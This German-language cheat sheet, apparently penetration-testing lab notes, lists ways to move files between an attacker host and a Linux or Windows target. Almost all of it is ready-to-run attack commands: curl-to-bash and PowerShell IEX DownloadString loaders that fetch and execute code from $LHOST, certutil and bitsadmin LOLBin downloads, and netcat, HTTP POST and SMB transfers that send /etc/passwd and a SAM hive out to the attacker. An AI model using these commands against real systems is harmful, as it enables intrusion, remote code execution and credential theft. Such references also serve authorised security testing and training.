# 📤 File Transfer — Angreifer ↔ Target

## 🐧 Linux Target

### HTTP (am häufigsten)

```bash
# Auf Angreifer (Server starten im Loot-Dir)
python3 -m http.server 8000
python2 -m SimpleHTTPServer 8000

# Auf Target (Download)
wget http://$LHOST:8000/linpeas.sh
curl http://$LHOST:8000/linpeas.sh -o linpeas.sh
curl -L http://$LHOST:8000/file | bash         # direkt ausführen
```

### Upload (Target → Angreifer)

```bash
# Auf Angreifer: Upload-Server
python3 -m uploadserver 8000                    # pip install uploadserver

# Oder mit nc:
# Angreifer:
nc -lvnp 4444 > received_file
# Target:
nc $LHOST 4444 < file_to_send

# Über HTTP-POST (wenn uploadserver läuft)
curl -X POST http://$LHOST:8000/upload -F "files=@/etc/passwd"
```

### SCP (wenn SSH)

```bash
scp file user@$RHOST:/tmp/                       # hochladen
scp user@$RHOST:/tmp/file .                       # runterladen
scp -i key file user@$RHOST:/tmp/
```

### Base64 (für kleine Files ohne Transfer-Möglichkeit)

```bash
# Auf Angreifer
base64 -w0 file
# → kopieren

# Auf Target
echo "BASE64STRING" | base64 -d > file
```

## 🪟 Windows Target

### PowerShell Download

```powershell
# Modern
IWR -Uri http://$LHOST:8000/nc.exe -OutFile nc.exe
Invoke-WebRequest http://$LHOST:8000/winpeas.exe -OutFile winpeas.exe

# Älter
(New-Object Net.WebClient).DownloadFile('http://$LHOST:8000/nc.exe','C:\Temp\nc.exe')

# In-Memory ausführen (kein Disk-Write!)
IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/script.ps1')
IEX(IWR http://$LHOST:8000/script.ps1 -UseBasicParsing)
```

### certutil (LOLBin, oft erlaubt)

```cmd
certutil -urlcache -split -f http://$LHOST:8000/nc.exe nc.exe
certutil -urlcache -f http://$LHOST:8000/file.exe file.exe
```

### SMB (sehr praktisch — auch für .exe auf Pivot-Hosts!)

```bash
# Auf Angreifer: SMB-Server
impacket-smbserver share . -smb2support
impacket-smbserver share . -smb2support -user test -password test     # mit Auth

# Auf Target
copy \\$LHOST\share\nc.exe .
copy \\$LHOST\share\winPEASx64.exe C:\Windows\Temp\winpeas.exe
\\$LHOST\share\winpeas.exe                                            # direkt ausführen
# Upload zum Angreifer:
copy C:\loot\sam.hive \\$LHOST\share\
```

> **Lab-Tipp:** SMB-Copy von einem Kali-`impacket-smbserver` ist der zuverlässigste Weg,
> eine `.exe` (z.B. `nc.exe`, `winPEAS.exe`) auf einen Windows-Host zu bekommen, wenn
> `certutil`/HTTP geblockt ist.

### FTP (wenn vorhanden)

```cmd
# Non-interactive
echo open $LHOST 21 > ftp.txt
echo user anonymous anonymous >> ftp.txt
echo binary >> ftp.txt
echo get file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

### Bitsadmin (LOLBin)

```cmd
bitsadmin /transfer myJob /download /priority high http://$LHOST:8000/nc.exe C:\Temp\nc.exe
```

## 🔄 Netcat (beide Richtungen, OS-agnostisch)

```bash
# Empfänger (wartet auf File):
nc -lvnp 4444 > outfile

# Sender:
nc $RHOST 4444 < infile
nc -w3 $RHOST 4444 < infile          # mit timeout
```

## 📋 Quick-Reference: Welche Methode wann?

| Situation | Methode |
|---|---|
| Linux, HTTP raus erlaubt | `python3 -m http.server` + `wget` |
| Windows, will kein Disk-Write | `IEX(New-Object Net.WebClient).DownloadString` |
| Windows, AV blockt Download | `certutil` oder SMB |
| .exe auf Windows-Pivot bringen | `impacket-smbserver` + `copy \\IP\share\` |
| Kein Outbound vom Target | nc reverse / über bestehende Shell base64 |
| Großes File, SSH da | `scp` |
| Loot raus (Target → Angreifer) | `nc` listener oder SMB-Upload |
